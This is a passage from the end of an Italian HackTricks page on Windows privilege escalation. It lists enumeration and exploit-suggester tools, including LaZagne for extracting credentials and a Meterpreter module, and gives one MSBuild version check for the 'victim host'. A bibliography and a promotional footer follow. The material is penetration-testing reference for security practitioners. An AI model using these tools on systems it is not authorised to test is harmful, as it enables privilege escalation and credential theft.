[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera l'host alla ricerca di configurazioni errate (più uno strumento per raccogliere informazioni che per l'escalation dei privilegi) (deve essere compilato) **(**[**precompilato**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Estrae credenziali da molti software (exe precompilato su github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Porting di PowerUp in C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Verifica le configurazioni errate (eseguibile precompilato su github). Non raccomandato. Non funziona bene in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica le possibili configurazioni errate (exe da python). Non raccomandato. Non funziona bene in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Strumento creato basato su questo post (non ha bisogno di accesschk per funzionare correttamente, ma può usarlo).

**Locale**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Legge l'output di **systeminfo** e consiglia exploit funzionanti (python locale)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Legge l'output di **systeminfo** e consiglia exploit funzionanti (python locale)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

È necessario compilare il progetto utilizzando la versione corretta di .NET ([vedi qui](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Per vedere la versione installata di .NET sull'host vittima, puoi eseguire:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografia

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
